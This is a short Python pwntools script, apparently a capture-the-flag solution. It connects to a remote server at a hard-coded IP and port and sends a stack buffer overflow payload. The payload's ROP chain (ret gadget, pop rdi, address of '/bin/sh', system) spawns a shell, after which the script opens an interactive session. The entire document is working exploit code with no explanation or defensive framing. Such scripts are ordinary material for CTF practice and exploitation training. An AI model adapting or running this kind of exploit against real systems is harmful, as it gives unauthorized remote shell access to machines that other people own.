from pwn import *
context(arch='amd64',os='linux',log_level='debug',endian='little')
#p=process('./fyfkgkz')
p=remote('111.200.241.244',45074)
p.recvuntil('>')
ret=0x400489
pop_rdi_ret=0x400863
system=0x4004B0
binsh=0x400888
payload='a'*0x200+'bbbbbbbb'+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.sendline(payload)
p.interactive()
#p.close()

